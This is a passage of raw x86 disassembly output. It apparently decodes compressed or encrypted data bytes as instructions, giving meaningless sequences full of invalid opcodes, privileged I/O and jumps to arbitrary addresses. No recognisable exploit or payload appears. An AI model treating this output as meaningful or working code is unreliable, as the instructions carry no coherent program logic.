  41cb17:	outs   dx,BYTE PTR ds:[esi]
  41cb18:	xor    eax,0x63e56b5b
  41cb1d:	lock jmp DWORD PTR ds:0x47585f16
  41cb24:	cmp    al,bl
  41cb26:	daa    
  41cb27:	aad    0x9c
  41cb29:	ins    BYTE PTR es:[edi],dx
  41cb2a:	test   edi,ecx
  41cb2c:	inc    esi
  41cb2d:	xchg   DWORD PTR [eax+0x2c],edx
  41cb30:	mov    cl,0x9b
  41cb32:	shl    BYTE PTR [edx+0x15],cl
  41cb35:	jbe    0x41cad0
  41cb37:	mov    ds:0xa66d546d,al
  41cb3c:	push   esi
  41cb3d:	xchg   ebx,eax
  41cb3e:	mov    edx,0xbf5c477a
  41cb43:	xor    eax,0x2bf53492
  41cb48:	psraw  mm3,QWORD PTR [edx-0x14]
  41cb4c:	pusha  
  41cb4d:	push   esp
  41cb4e:	ss std 
  41cb50:	adc    al,0x19
  41cb52:	ins    DWORD PTR es:[edi],dx
  41cb53:	mov    BYTE PTR [ebx-0x43],bh
  41cb56:	push   ds
  41cb57:	ficom  WORD PTR [esi+0x16]
  41cb5a:	sub    DWORD PTR [esi+edi*4],ebx
  41cb5d:	pop    ds
  41cb5e:	xchg   esi,eax
  41cb5f:	jns    0x41cae2
  41cb61:	jae    0x41cbbf
  41cb63:	outs   dx,BYTE PTR ds:[esi]
  41cb64:	push   eax
  41cb65:	or     eax,0xf8daf0e
  41cb6a:	ins    DWORD PTR es:[edi],dx
  41cb6b:	js     0x41cb44
  41cb6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb6e:	bound  edi,QWORD PTR [esi]
  41cb70:	mov    bh,0xcd
  41cb72:	mov    ch,0xdc
  41cb74:	sub    al,0x6d
  41cb76:	and    al,0x23
  41cb79:	fisttp WORD PTR [eax-0x39]
  41cb7c:	int    0x12
  41cb7e:	mov    bh,0x3c
  41cb80:	fisubr DWORD PTR [eax]
  41cb82:	adc    eax,0xcc480f7d
  41cb87:	adc    esp,DWORD PTR [edi]
  41cb89:	add    eax,0xa72a4a2e
  41cb8e:	arpl   WORD PTR [ecx-0x76],dx
	...
  41cbf1:	add    BYTE PTR [eax],al
  41cbf3:	add    BYTE PTR [ecx],ch
  41cbf5:	(bad)  
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0xe458c222
  41cc03:	xor    DWORD PTR [edx+0x5000131],esi
  41cc09:	add    DWORD PTR [eax],eax
  41cc0b:	add    al,dh
  41cc0d:	rcr    DWORD PTR [edi-0x41585a67],cl
  41cc13:	int    0x42
  41cc15:	add    ah,bl
  41cc17:	and    DWORD PTR [ecx+0x45aa4cf5],edx
  41cc1d:	xor    edx,DWORD PTR ds:0x88e1ee1a
  41cc23:	dec    edi
  41cc24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc25:	adc    DWORD PTR [ecx+0x256540af],ebx
  41cc2b:	arpl   WORD PTR [edi],bp
  41cc2d:	pop    ss
  41cc2e:	xor    BYTE PTR [ebx+0x60e1b6b],al
  41cc34:	test   BYTE PTR [edi+ebx*8+0x6f3e0fa8],0x3e
  41cc3c:	pop    ss
  41cc3d:	pushf  
  41cc3e:	jne    0x41cc96
  41cc40:	retf   0xd219
  41cc43:	adc    DWORD PTR [ebx+0x437650ff],esi
  41cc49:	mov    esp,0x6ce974c4
  41cc4e:	pop    ebp
  41cc4f:	cmp    al,0x6f
  41cc51:	and    al,0x48
  41cc53:	xlat   BYTE PTR ds:[ebx]
  41cc54:	clc    
  41cc55:	jno    0x41cbe6
  41cc57:	cmp    BYTE PTR [esi-0x5],ah
  41cc5a:	les    eax,FWORD PTR [eax]
  41cc5c:	rcr    ebp,1
  41cc5e:	outs   dx,DWORD PTR ds:[esi]
  41cc5f:	pop    ss
  41cc60:	xor    ch,0xc6
  41cc63:	imul   edx,DWORD PTR [ebx],0x2c
  41cc66:	popa   
  41cc67:	call   0xbd23:0xd1c5fe2e
  41cc6e:	call   0x5e0ab758
  41cc73:	stos   DWORD PTR es:[edi],eax
  41cc74:	ret    0xb0e1
  41cc77:	adc    ch,dh
  41cc79:	les    edx,FWORD PTR [esi+0xb5b536a]
  41cc7f:	inc    ebp
  41cc80:	and    eax,0xf9e4507e
  41cc85:	rcr    BYTE PTR [ebx],0x8
  41cc88:	xchg   ebp,eax
  41cc89:	pop    ecx
  41cc8a:	into   
  41cc8b:	stos   DWORD PTR es:[edi],eax
  41cc8c:	sahf   
  41cc8d:	mov    bl,0x7a
  41cc8f:	and    esp,edi
  41cc91:	and    BYTE PTR [edx+0x41],0x39
  41cc95:	xor    eax,0x45e9bc0e
  41cc9a:	xchg   ebx,eax
  41cc9b:	pusha  
  41cc9c:	xchg   BYTE PTR [edi-0x526c6480],bl
  41cca2:	std    
  41cca3:	jmp    0xa2291ed8
  41cca8:	mov    bh,0x27
  41ccaa:	pop    ecx
  41ccab:	push   ecx
  41ccac:	gs aaa 
  41ccae:	jns    0x41cd06
  41ccb0:	adc    DWORD PTR [ebx-0x33],esi
  41ccb3:	(bad)  
  41ccb4:	popf   
  41ccb5:	adc    esi,DWORD PTR [eax+0x2f56492d]
  41ccbb:	push   cs
  41ccbc:	fnstcw WORD PTR [esi+0x16a8ef01]
  41ccc2:	rcl    ecx,0xfb
  41ccc5:	inc    edx
  41ccc6:	pop    ecx
  41ccc7:	retf   0x702d
  41ccca:	leave  
  41cccb:	xchg   dx,ax
  41cccd:	cmp    BYTE PTR [ecx+0x6c],dh
  41ccd0:	das    
  41ccd1:	ror    DWORD PTR [edi-0x16e892e2],0xf
  41ccd8:	or     ebx,esi
  41ccda:	dec    edx
  41ccdb:	mov    edi,0xc5557386
  41cce0:	fadd   QWORD PTR [eax]
  41cce2:	sub    ebx,DWORD PTR ds:0x8dd3ae
  41cce8:	popw   ss
  41ccea:	xchg   edi,eax
  41cceb:	ins    DWORD PTR es:[edi],dx
  41ccec:	xchg   BYTE PTR [eax+0x2a],bh
  41ccef:	ss pop edi
  41ccf1:	inc    ebx
  41ccf2:	sub    ebx,DWORD PTR ds:0x36579459
  41ccf8:	jg     0x41cd39
  41ccfa:	retf   0xb788
  41ccfd:	mov    ebx,0xf175c371
  41cd02:	jle    0x41cd3b
  41cd04:	dec    esp
  41cd05:	push   cs
  41cd06:	shr    ebx,cl
  41cd08:	xor    BYTE PTR [eax+0x3b],al
  41cd0b:	ret    0x6641
  41cd0e:	in     al,0x11
  41cd10:	xlat   BYTE PTR ds:[ebx]
	...
  41cd71:	add    BYTE PTR [eax],al
  41cd73:	add    BYTE PTR [eax-0x67],ah
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	mov    esp,0xb74d57a5
  41cd85:	xor    al,BYTE PTR [ecx]
  41cd87:	add    BYTE PTR ds:0xb2000001,al
  41cd8d:	xor    DWORD PTR [edi+0x67],esi
  41cd90:	gs das 
  41cd92:	(bad)  [edx]
  41cd94:	inc    ecx
  41cd95:	out    0x42,eax
  41cd97:	mov    BYTE PTR [edx+0x17b25ad7],ch
  41cd9d:	sti    
  41cd9e:	call   0x52aa3789
  41cda3:	out    0x98,al
  41cda5:	mov    al,ds:0x153920ba
  41cdaa:	jne    0x41cdec
  41cdac:	xor    al,0x2
  41cdae:	push   eax
  41cdaf:	out    0x5b,al
  41cdb1:	nop
  41cdb2:	jmp    0x41ce33
  41cdb4:	call   0xdb100026
  41cdb9:	in     eax,dx
  41cdba:	aad    0x56
  41cdbc:	bound  ebp,QWORD PTR [ebp-0x45]
  41cdbf:	jnp    0x41cdbc
  41cdc1:	das    
  41cdc2:	retf   
  41cdc3:	hlt    
  41cdc4:	clc    
  41cdc5:	and    BYTE PTR [ecx],bh
  41cdc7:	daa    
  41cdc8:	and    DWORD PTR [ecx],ebp
  41cdca:	dec    esp
  41cdcb:	js     0x41cd76
  41cdcd:	push   ebp
  41cdce:	arpl   WORD PTR [edx+0x6657dd61],cx
  41cdd4:	enter  0xb421,0xb
  41cdd8:	pop    eax
  41cdd9:	adc    bh,BYTE PTR [eax+0x53]
  41cddc:	push   0x59
  41cdde:	jecxz  0x41cdab
  41cde0:	aam    0xda
  41cde2:	nop
  41cde3:	nop
  41cde4:	dec    esp
  41cde5:	mov    eax,0x245f389b
  41cdea:	sti    
  41cdeb:	sub    al,0xe7
  41cded:	adc    edx,DWORD PTR gs:[edi]
  41cdf0:	cld    
  41cdf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdf2:	aad    0xa9
  41cdf4:	xchg   BYTE PTR [ebx+0x4bcb550c],dl
  41cdfa:	lods   eax,DWORD PTR ds:[esi]
  41cdfb:	addr16 sbb al,cl
  41cdfe:	pop    ecx
  41cdff:	fs in  al,dx
  41ce01:	es stos DWORD PTR es:[edi],eax
  41ce03:	xchg   BYTE PTR [esi+edi*2+0x53f280dd],bl
  41ce0a:	adc    al,0xa8
  41ce0c:	sbb    bl,BYTE PTR [eax]
  41ce0e:	hlt    
  41ce0f:	sbb    eax,0x61082d61
  41ce14:	repz ror BYTE PTR [edi-0x129112fb],cl
  41ce1b:	stc    
  41ce1c:	loope  0x41cd9e
  41ce1e:	into   
  41ce1f:	inc    edi
  41ce20:	mov    fs,WORD PTR [edi+ebp*8-0x43]
  41ce24:	in     eax,0xb6
  41ce26:	inc    esp
  41ce27:	(bad)  
  41ce28:	jae    0x41ce6c
  41ce2a:	push   ebx
  41ce2b:	(bad)  
  41ce2c:	out    dx,eax
  41ce2d:	xchg   edx,eax
  41ce2e:	mov    ah,0xe4
  41ce30:	dec    ecx
  41ce31:	arpl   WORD PTR [ecx],bp
  41ce33:	fisttp WORD PTR [esi+0x514a3e11]
  41ce39:	fs leave 
  41ce3b:	pop    ecx
  41ce3c:	adc    al,0x5c
  41ce3e:	sbb    bl,dl
  41ce40:	pop    DWORD PTR [esi]
  41ce42:	mov    ebx,0xe4d0bfa1
  41ce47:	or     DWORD PTR [eax],eax
  41ce49:	mov    edx,0xafdeb85
  41ce4e:	fs jo  0x41ce6e
  41ce51:	xchg   edi,eax
  41ce52:	mov    al,0x2d
  41ce54:	fild   WORD PTR [edx-0x8]
  41ce57:	(bad)  
  41ce58:	sbb    eax,0x1cd16089
  41ce5d:	push   ds
  41ce5e:	and    esi,0xffffff9e
  41ce61:	pop    esp
  41ce62:	mov    DWORD PTR [edi],ebx
  41ce64:	or     ecx,DWORD PTR [ebp+0x5d9c669d]
  41ce6a:	push   es
  41ce6b:	icebp  
  41ce6c:	sbb    edx,DWORD PTR [edx+0x48]
  41ce6f:	fwait
  41ce70:	ins    DWORD PTR es:[edi],dx
  41ce71:	cmp    bh,BYTE PTR [edx+eiz*2]
  41ce74:	jns    0x41ce11
  41ce76:	(bad)  
  41ce77:	push   eax
  41ce78:	daa    
  41ce79:	lea    ecx,[eax+0x3ba5433b]
  41ce7f:	div    DWORD PTR [edi-0x1b]
  41ce82:	pushf  
  41ce83:	adc    DWORD PTR [esi],esp
  41ce85:	fdiv   DWORD PTR [ebp+0x7b]
  41ce88:	(bad)  
  41ce89:	fistp  DWORD PTR [eax]
  41ce8b:	xor    DWORD PTR [edi+ebx*8+0xa5e7ef],0x0
	...
  41cef2:	add    BYTE PTR [eax],al
  41cef4:	pop    es
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	or     DWORD PTR [ebp+ebp*2+0x5c],edi
  41cf04:	mov    esp,0x5000133
  41cf09:	add    DWORD PTR [eax],eax
  41cf0b:	add    BYTE PTR [ecx+0x20],al
  41cf0e:	mov    ds:0x23bbeb50,eax
  41cf13:	out    dx,eax
  41cf14:	fucomp st(3)
  41cf16:	outs   dx,DWORD PTR ds:[esi]
  41cf17:	js     0x41cef3
  41cf19:	in     eax,dx
  41cf1a:	aam    0x64
  41cf1c:	cwde   
  41cf1d:	icebp  
  41cf1e:	jno    0x41cebd
  41cf20:	in     al,dx
  41cf21:	loopne 0x41cf02
  41cf23:	cs in  eax,dx
  41cf25:	dec    ebx
  41cf26:	addr16 or al,0xd
  41cf29:	and    bh,BYTE PTR [esp+ecx*4+0x1c]
  41cf2d:	ins    DWORD PTR es:[edi],dx
  41cf2e:	pop    edx
  41cf2f:	adc    bl,BYTE PTR [edi-0x588deeda]
  41cf35:	aad    0xdb
  41cf37:	sbb    dh,BYTE PTR [ecx]
  41cf39:	repnz mov esi,0xe6100de1
  41cf3f:	in     eax,0xe2
  41cf41:	lea    esi,[ecx]
  41cf43:	inc    ebp
  41cf44:	mov    ?,esi
  41cf46:	add    DWORD PTR [eax+0x3207fceb],edx
  41cf4c:	pusha  
  41cf4d:	mov    dh,0x67
  41cf4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf50:	outs   dx,DWORD PTR ds:[esi]
  41cf51:	leave  
  41cf52:	jns    0x41cedf
  41cf54:	or     BYTE PTR [eax+ebx*1+0x28a6bdbf],ch
  41cf5b:	loopne 0x41cf1f
  41cf5d:	stos   DWORD PTR es:[edi],eax
  41cf5e:	or     bh,BYTE PTR [eax]
  41cf60:	jle    0x41cf01
  41cf62:	pop    edx
  41cf63:	push   esi
  41cf64:	stos   BYTE PTR es:[edi],al
  41cf65:	push   ebx
  41cf66:	jae    0x41cf2d
  41cf68:	pop    edi
  41cf69:	fistp  DWORD PTR [esp+edi*4+0x1015add9]
  41cf70:	mov    esp,0xa4d18e69
  41cf75:	pop    ebx
  41cf76:	jnp    0x41cfd2
  41cf78:	arpl   WORD PTR [edi+ecx*2],dx
  41cf7b:	dec    ebx
  41cf7c:	ds jno 0x41cf66
  41cf7f:	mov    ebp,0xefe4bb53
  41cf84:	mov    bh,0x55
  41cf86:	(bad)  
  41cf87:	and    al,0xfc
  41cf89:	rol    DWORD PTR [eax],cl
  41cf8b:	inc    edx
  41cf8c:	adc    cl,BYTE PTR [ecx]
  41cf8e:	in     al,0x7b
  41cf90:	pusha  
  41cf91:	scas   al,BYTE PTR es:[edi]
  41cf92:	jbe    0x41cf20
  41cf94:	add    BYTE PTR [eax-0x4f1bf522],dl
  41cf9a:	cmp    BYTE PTR [ebp+0x32],0x77
  41cf9e:	dec    edi
  41cf9f:	sti    
  41cfa0:	dec    edi
  41cfa1:	dec    ebx
  41cfa2:	adc    DWORD PTR [ebp+0x207cfe4d],edx
  41cfa8:	sub    DWORD PTR [ecx-0x6748949a],ebp
  41cfae:	out    0x2b,eax
  41cfb0:	xor    al,0xf
  41cfb2:	nop
  41cfb3:	xchg   edx,eax
  41cfb4:	xor    BYTE PTR [edx+0x131144ca],bh
  41cfba:	xchg   DWORD PTR [edx+eiz*4+0x71],ecx
  41cfbe:	repnz dec edi
  41cfc0:	pushf  
  41cfc1:	gs sbb ebx,0xffffffe1
  41cfc5:	rcr    BYTE PTR ds:0xdb0fe714,cl
  41cfcb:	mov    bh,0x30
  41cfcd:	push   ebp
  41cfce:	mov    ebx,gs
  41cfd0:	scas   eax,DWORD PTR es:[edi]
  41cfd1:	pop    eax
  41cfd2:	jo     0x41cfbe
  41cfd4:	aas    
  41cfd5:	arpl   bx,sp
  41cfd7:	sbb    edx,DWORD PTR [esp+eax*2]
  41cfda:	inc    ebx
  41cfdb:	xor    al,0x2d
  41cfdd:	fwait
  41cfde:	mov    esp,0xf64076f9
  41cfe3:	adc    eax,0x1dfede33
  41cfe8:	popf   
  41cfe9:	sbb    ebx,DWORD PTR ds:0xf160c2b9
  41cfef:	mov    ah,0x41
  41cff1:	cmp    dl,cl
  41cff3:	mov    edi,0xf978e37e
  41cff8:	xchg   edx,eax
  41cff9:	or     al,BYTE PTR [ebx]
  41cffb:	add    BYTE PTR [esi+0x46],dh
  41cffe:	out    0x20,al
  41d000:	sbb    DWORD PTR [ecx],edx
  41d002:	sub    ecx,DWORD PTR [ebp+0x26]
  41d005:	jmp    0x333c6348
  41d00a:	inc    ecx
  41d00b:	jg     0x41cfa3
  41d00d:	mov    edi,0xfe51b3
	...
  41d072:	add    BYTE PTR [eax],al
  41d074:	mov    ecx,0xad432034
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0x6a34b2bd
  41d083:	fcmovb st,st(1)
  41d085:	xor    al,0x1
  41d087:	add    BYTE PTR ds:0xcf000001,al
  41d08d:	mov    dh,0x2c
  41d08f:	hlt    
  41d090:	fprem  
  41d092:	sahf   
  41d093:	push   cs
  41d094:	push   eax
  41d095:	retf   0xb013
  41d098:	cmc    
  41d099:	imul   eax,DWORD PTR [esi],0x78
  41d09c:	enter  0xa35e,0xa8
  41d0a0:	in     al,0x17
  41d0a2:	jmp    0x41d05a
  41d0a4:	fld    TBYTE PTR [ebp-0x15e2eeb5]
  41d0aa:	loop   0x41d07e
  41d0ac:	and    eax,DWORD PTR [edi-0x399a93fa]
  41d0b2:	sti    
  41d0b3:	cmp    edx,DWORD PTR [esi+0x2f]
  41d0b6:	push   0x7b
  41d0b8:	imul   ebp,DWORD PTR [edi],0x61
  41d0bb:	and    ebx,eax
  41d0bd:	pop    eax
  41d0be:	dec    ebx
  41d0bf:	shr    ebp,0xaa
  41d0c2:	jns    0x41d13a
  41d0c4:	ins    DWORD PTR es:[edi],dx
  41d0c5:	pop    ebp
  41d0c6:	syscall 
  41d0c8:	outs   dx,BYTE PTR ds:[esi]
  41d0c9:	push   ds
  41d0ca:	adc    esi,DWORD PTR [ecx-0x5b]
  41d0cd:	shr    DWORD PTR ss:[eiz*2+0x681ec1f3],cl
  41d0d5:	dec    ebp
  41d0d6:	retf   0x6ebd
  41d0d9:	ret    
  41d0da:	lahf   
  41d0db:	push   ecx
  41d0dc:	je     0x41d08e
  41d0de:	jns    0x41d130
  41d0e0:	sub    bl,0xf3
  41d0e3:	sbb    eax,0xd8c883dd
  41d0e8:	call   0x1924:0x81e36496
  41d0ef:	pop    ds
  41d0f0:	gs and eax,0x7d35ead3
  41d0f6:	addr16 pop cx
  41d0f9:	int3   
  41d0fa:	inc    edi
  41d0fb:	cmp    BYTE PTR [edx+0x63],ch
  41d0fe:	mov    ebp,0xf5ecbec3
  41d103:	adc    BYTE PTR [edi+ebp*2-0x3800375d],0x18
  41d10b:	xor    eax,DWORD PTR [ecx+edi*8]
  41d10e:	call   0x8c0d:0x76bf1483
  41d115:	pop    edx
  41d116:	sbb    al,0x93
  41d118:	dec    edx
  41d119:	outs   dx,DWORD PTR ds:[esi]
  41d11a:	int    0x3
  41d11c:	mov    ebp,0x4c0e7877
  41d121:	inc    eax
  41d122:	clc    
  41d123:	retf   0x1b9e
  41d126:	cmp    bl,BYTE PTR [eax+0x31]
  41d129:	inc    edi
  41d12a:	lock adc ah,dh
  41d12d:	xor    al,0x3e
  41d12f:	pop    eax
  41d130:	scas   eax,DWORD PTR es:[edi]
  41d131:	pop    ss
  41d132:	lahf   
  41d133:	push   ecx
  41d134:	adc    BYTE PTR [edx+esi*2],bl
  41d137:	loopne 0x41d12c
  41d139:	push   0x7b85ce33
  41d13e:	xor    eax,0x69e0634f
  41d143:	ja     0x41d16f
  41d145:	dec    eax
  41d146:	mov    ds:0xd2fad696,al
  41d14b:	xchg   edi,eax
  41d14c:	mov    ch,0xc0
  41d14e:	jbe    0x41d187
  41d150:	mov    bh,0x85
  41d152:	mov    ecx,0x233ff6aa
  41d157:	test   BYTE PTR [eax-0x2cc1e3f4],0xaf
  41d15e:	test   ch,cl
  41d160:	jmp    0x41d1dd
  41d162:	inc    esi
  41d163:	inc    esi
  41d164:	fld    QWORD PTR [eax]
  41d166:	les    ecx,FWORD PTR [edx-0x45d16ddb]
  41d16c:	dec    esp
  41d16d:	(bad)  
  41d16f:	rcl    ecx,0x35
  41d172:	jno    0x41d1bd
  41d174:	inc    esi
  41d175:	fstp   TBYTE PTR [ebx-0x5e]
  41d178:	fimul  WORD PTR [ecx]
  41d17a:	sbb    al,0x53
  41d17c:	and    eax,0xf277ee4a
  41d181:	mov    ds:0xc9c3fe1f,eax
  41d186:	std    
  41d187:	aaa    
  41d188:	mov    ecx,0xe356a2ae
  41d18d:	mov    ds,WORD PTR [ecx+0x7337]
	...
  41d1f3:	add    BYTE PTR [eax-0x3d],dl
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	popa   
  41d201:	xchg   esp,eax
  41d202:	mov    eax,ds:0x135c6dc
  41d207:	add    BYTE PTR ds:0x51000001,al
  41d20d:	icebp  
  41d20e:	dec    edx
  41d20f:	sar    BYTE PTR [ebx],cl
  41d211:	mov    ?,ebx
  41d213:	jl     0x41d285
  41d215:	test   eax,0x5570156d
  41d21a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d21b:	mov    ch,0x7d
  41d21d:	ret    0x76f8
  41d220:	mov    edx,0x276a27a8
  41d225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d226:	and    eax,0x9c1a3dda
  41d22b:	stc    
  41d22c:	mov    dh,0xab
  41d22e:	pop    edi
  41d22f:	stos   BYTE PTR es:[edi],al
  41d230:	popf   
  41d231:	daa    
  41d232:	ja     0x41d2ae
  41d234:	out    0x4d,eax
  41d236:	add    DWORD PTR [ebx*1-0x20cc3c9f],0x32
  41d23e:	call   0x1b2ebbe5
  41d243:	into   
  41d244:	pop    ecx
  41d245:	xchg   esi,eax
  41d246:	js     0x41d2a9
  41d248:	fwait
  41d249:	mov    esi,0x23e4a7c2
  41d24e:	cld    
  41d24f:	xchg   esi,eax
  41d250:	(bad)  
  41d251:	jmp    0x2016062b
  41d256:	fucom  st(0)
  41d258:	mov    al,0xf5
  41d25a:	and    al,0xbf
  41d25c:	push   eax
  41d25d:	add    esp,esi
  41d25f:	pop    es
  41d260:	scas   eax,DWORD PTR es:[edi]
  41d261:	cmp    eax,0xa1ff5978
  41d266:	xchg   edx,eax
  41d267:	aaa    
  41d268:	test   DWORD PTR [ebp-0x5c845ac1],0x32b1d770
  41d272:	out    dx,al
  41d273:	sub    BYTE PTR [ebp+0x51],ch
  41d276:	in     eax,dx
  41d277:	fxch   st(2)
  41d279:	ds xchg esi,eax
  41d27b:	xchg   ebp,eax
  41d27c:	aaa    
  41d27d:	ds jl  0x41d248
  41d280:	fnsave [ecx-0x7f]
  41d283:	sub    bl,bh
  41d285:	pop    edx
  41d286:	jp     0x41d2ee
  41d288:	aam    0xb1
  41d28a:	stos   BYTE PTR es:[edi],al
  41d28b:	cdq    
  41d28c:	or     al,0xed
  41d28e:	test   BYTE PTR [edi-0x17203644],dl
  41d294:	ins    BYTE PTR es:[edi],dx
  41d295:	arpl   WORD PTR [eax],si
  41d297:	fisub  DWORD PTR [edi-0x71]
  41d29a:	xchg   ebp,eax
  41d29b:	mov    al,ds:0x29fe8093
  41d2a0:	xor    bh,BYTE PTR ss:[ebx+0x39]
  41d2a4:	mul    DWORD PTR [esi+0x5]
  41d2a7:	jl     0x41d239
  41d2a9:	pop    ecx
  41d2aa:	jmp    0x41d29f
  41d2ac:	in     al,0x85
  41d2ae:	popa   
  41d2af:	sub    DWORD PTR fs:[ebp+0xe6433c4],ebx
  41d2b6:	ds ror esp,0xd6
  41d2ba:	pop    ss
  41d2bb:	cmp    ecx,DWORD PTR [ebp+0x717c67b1]
  41d2c1:	ficomp DWORD PTR [edx-0x4be3f6fc]
  41d2c7:	sub    DWORD PTR [eax-0x18962f17],esi
  41d2cd:	adc    eax,0xfd44bbf7
  41d2d2:	in     al,dx
  41d2d3:	js     0x41d30a
  41d2d5:	popf   
  41d2d6:	into   
  41d2d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2d8:	jg     0x41d265
  41d2da:	addr16 mov esp,0x923f6f74
  41d2e0:	dec    ebx
  41d2e1:	xlat   BYTE PTR ds:[ebx]
  41d2e2:	cmp    eax,0x8a51e96d
  41d2e7:	push   ecx
  41d2e8:	inc    esi
  41d2e9:	jecxz  0x41d358
  41d2eb:	mov    esi,0xab764e89
  41d2f0:	arpl   WORD PTR [ebx-0x3c889cc6],dx
  41d2f6:	mov    ch,0x4e
  41d2f8:	sub    edi,ebp
  41d2fa:	mov    dh,0xcc
  41d2fc:	adc    al,0xfb
  41d2fe:	inc    edx
  41d2ff:	xchg   edx,eax
  41d300:	push   ss
  41d301:	mov    al,ds:0x9fbd7051
  41d306:	gs jo  0x41d30b
  41d309:	xor    ebp,edi
  41d30b:	mov    ebp,eax
  41d30d:	adc    ecx,DWORD PTR [eax+ebx*1+0x81]
	...
  41d374:	inc    BYTE PTR [eax+0x7dff54f9]
  41d37a:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d380:	inc    ecx
  41d381:	ret    
  41d382:	mul    esp
  41d384:	retf   
  41d385:	add    DWORD PTR ss:[eax],eax
  41d388:	add    eax,0x54000001
  41d38d:	leave  
  41d38e:	mov    bh,0xdd
  41d390:	and    esi,edx
  41d392:	push   ecx
  41d393:	dec    edx
  41d394:	push   edi
  41d395:	retf   0x1d73
  41d398:	push   esi
  41d399:	mov    cl,0xbd
  41d39b:	xor    al,0xbb
  41d39d:	cmc    
  41d39e:	mov    eax,0x98f3fd4
  41d3a3:	mov    ecx,0x6ffdad92
  41d3a8:	sbb    BYTE PTR [edx],bl
  41d3aa:	xchg   edx,eax
  41d3ab:	imul   edi,DWORD PTR [eax+edi*8+0x4a],0x28
  41d3b0:	xchg   BYTE PTR [edx],ah
  41d3b2:	shl    BYTE PTR [edi-0x7db9eae4],1
  41d3b8:	xchg   DWORD PTR [esi+0x6f],esi
  41d3bb:	cmp    eax,ecx
  41d3bd:	out    0x67,eax
  41d3bf:	aad    0xa0
  41d3c1:	push   edi
  41d3c2:	in     al,dx
  41d3c3:	adc    BYTE PTR [ebx],ch
  41d3c5:	inc    edi
  41d3c6:	inc    esi
  41d3c7:	js     0x41d3c9
  41d3c9:	xchg   ebp,eax
  41d3ca:	sub    ch,al
  41d3cc:	rcl    BYTE PTR [esi-0x61],cl
  41d3cf:	imul   ebx,esp,0x6ebe1294
  41d3d5:	add    al,0x38
  41d3d7:	js     0x41d38e
  41d3d9:	pop    esi
  41d3da:	jns    0x41d420
  41d3dc:	or     DWORD PTR [ecx],ecx
  41d3de:	cwde   
  41d3df:	mov    esi,0x1bab4abe
  41d3e4:	inc    edx
  41d3e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3e6:	dec    eax
  41d3e7:	jge    0x41d419
  41d3e9:	mov    bh,0xf4
  41d3eb:	iret   
  41d3ec:	xor    DWORD PTR [ecx-0x60],ecx
  41d3ef:	pop    esp
  41d3f0:	add    eax,0x637b6cda
  41d3f5:	pop    esp
  41d3f6:	ins    BYTE PTR es:[edi],dx
  41d3f7:	rol    DWORD PTR [esp+ecx*1+0x11],0x39
  41d3fc:	mov    ah,0xa
  41d3fe:	adc    BYTE PTR [ecx+0x10],bh
  41d401:	les    ecx,FWORD PTR [edi]
  41d403:	mov    ebx,0xecec7513
  41d408:	pop    ecx
  41d409:	cmp    BYTE PTR [edx+0x2b87e896],ah
  41d40f:	sar    ebx,1
  41d411:	jg     0x41d3dc
  41d413:	or     DWORD PTR [esi+0x2e8c5ade],ecx
  41d419:	loopne 0x41d3db
  41d41b:	(bad)  
  41d41c:	cmp    esp,DWORD PTR [eax+0x227e0303]
  41d422:	sub    al,0x35
  41d424:	imul   ebx,DWORD PTR [edx],0x8c50b57d
  41d42a:	mov    al,ds:0xa2013172
  41d42f:	inc    eax
  41d430:	in     eax,0x5f
  41d432:	js     0x41d437
  41d434:	repnz into 
  41d436:	mov    dl,BYTE PTR ss:[edi+0x1e88bfee]
  41d43d:	inc    eax
  41d43e:	xchg   ecx,eax
  41d43f:	sub    ecx,eax
  41d441:	pop    edi
  41d442:	int3   
  41d443:	jns    0x41d3f0
  41d445:	jp     0x41d43e
  41d447:	mov    ds:0xc3c7353c,al
  41d44c:	fwait
  41d44d:	jae    0x41d457
  41d44f:	sub    DWORD PTR [ebp+0x58],eax
  41d452:	mov    eax,ds:0xd1298b18
  41d457:	cdq    
  41d458:	pop    edx
  41d459:	sar    BYTE PTR [esi],1
  41d45b:	mov    ds:0x931318f0,eax
  41d460:	std    
  41d461:	mov    esi,0x92ba9cde
  41d466:	dec    esp
  41d467:	xor    DWORD PTR [eax],eax
  41d469:	add    ebp,esp
  41d46b:	jle    0x41d452
  41d46d:	ret    0x3e32
  41d470:	inc    esp
  41d471:	sbb    BYTE PTR [eax+0x1679c6c3],0xfc
  41d478:	in     al,0xae
  41d47a:	mov    cl,0xf6
  41d47c:	pop    ebx
  41d47d:	aad    0xbd
  41d47f:	sub    al,0x86
  41d481:	aam    0x4c
  41d483:	xor    DWORD PTR ds:0x2e24c90d,esp
  41d489:	js     0x41d4f7
  41d48b:	or     BYTE PTR [ecx+0x5],bl
  41d48e:	rol    edi,0x1a
	...
  41d4f1:	add    BYTE PTR [eax],al
  41d4f3:	add    dh,dh
  41d4f5:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0xd039:0x7cbef089
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    eax,0xf0000001
  41d50d:	pop    ecx
  41d50e:	dec    edi
  41d50f:	xchg   esi,eax
  41d510:	int    0x4b
